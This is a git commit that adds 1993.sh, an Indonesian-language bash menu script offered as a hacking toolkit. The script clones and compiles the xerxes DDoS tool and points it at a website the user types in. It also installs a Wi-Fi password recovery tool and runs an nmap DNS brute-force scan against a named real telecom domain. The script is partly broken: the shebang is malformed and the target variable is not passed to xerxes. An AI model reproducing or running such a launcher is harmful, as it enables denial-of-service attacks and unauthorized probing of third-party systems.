000c07c4ddc644318279fd8110b06da3af77a8e1
@jomioo <74129759+jomioo@users.noreply.github.com>
2021-01-11 09:06:01 +0700

    Update and rename README.md to 1993.sh

---
+++ 1993.sh
@@ -0,0 +1,111 @@
+#!/system/1993.sh/bash
+clear
+echo
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+sleep 1
+echo $red "selamat datang di 1993"
+sleep 1
+ echo $yellow "hati-hati virus GYS"
+sleep 3
+echo        ":::::::::::::::::::::::::::"
+echo $white ":Author : yana supriatna  :"
+echo $green ":Kontak Me : 089635862599 :"
+echo $blue  ":time :virus YS           :"
+echo $yellow ":subscribe : Gemi Yana    :"
+echo        "::::::::::::::::::::::::::::"
+sleep 1
+echo $red  "::::::::::::::::::::::::::::::::::::::"
+echo $blue ":Thanks For : Indonesia Security Lite:"
+echo       "::::::::::::::::::::::::::::::::::::::"
+sleep 1
+echo $red   "::::::::::::::::::::::::::::::::::::::::::::::::::::::::>
+sleep 1
+echo $purple     "1.> DDOS xerxes"
+sleep 1
+echo $cyan  "::::::::::::::::::::::::::::::::::::::::::::::::::::::::>
+sleep 1
+echo $yellow     "2.> Install Wifresti (Wifi-Password Recovery tools)"
+sleep 1
+echo $red   "::::::::::::::::::::::::::::::::::::::::::::::::::::::::>
+sleep 1
+echo $green      "3.> bugs kartu 3 "
+sleep 1
+echo $blue  "::::::::::::::::::::::::::::::::::::::::::::::::::::::::>
+sleep 1
+echo $cyan       "0.> untuk keluar dari tools (exit)"
+sleep 1
+echo $purple"::::::::::::::::::::::::::::::::::::::::::::::::::::::::>
+sleep 1
+echo $red $yellow $green $blue $cyan
+read -p "root@T00Ls-1993.sh~#: "  bro
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant --gay "Yadi"
+apt update && apt upgrade
+apt install git
+apt install clang
+git clone https://github.com/zanyarjamal/xerxes
+mv xerxes $HOME
+cd $HOME/xerxes
+clang xerxes.c -o xerxes
+clear
+read -p "[masukanWebsiteTarget]>" target
+./xerxes target 80
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+toilet -f big -F gay "Yadi"
+sleep 1
+apt update
+apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/LionSec/wifresti
+mv wifresti $HOME
+cd $HOME/wifresti
+python2 wifresti.py
+fi
+
+if [ $bro = 3 ] || [ $bro = 3 ]
+then
+clear
+pkg update && pkg upgrade
+pkg install nmap
+pkg install wget
+nmap -p 80 -script dns-brute.nse bima.tri.co.id $HOME
+fi
+
+if [ $bro = 0 ] || [ $bro = 0 ]
+then
+echo $green"Gemi Yana"
+sleep 2
+echo
+echo $yellow"jangan lupa subscribe!!!!"
+sleep 2
+echo " Kami Bukan Musuh Dalam Selimut"
+sleep 2
+echo "  Kita Adalah Sahabat"
+sleep 2
+echo "   Kami Bukan Tipe Hacker Yang Kriminal;)"
+sleep 2
+echo "    Ketika kamu sudah berputus asa"
+sleep 2
+echo "Maka bangkitlah kembali untuk berjuang lebih giat:)"
+sleep 2
+echo "\033[32;1mInsya Allah semua yang kamu inginkan akan Tercapai:)"
+echo
+echo $white 'SALAM HACKER ( WHITE HAT )'
+echo
+sleep 1
+exit
+fi
--- README.md
+++
@@ -1,3 +0,0 @@
-Heck wifi 
-
-Bagus 
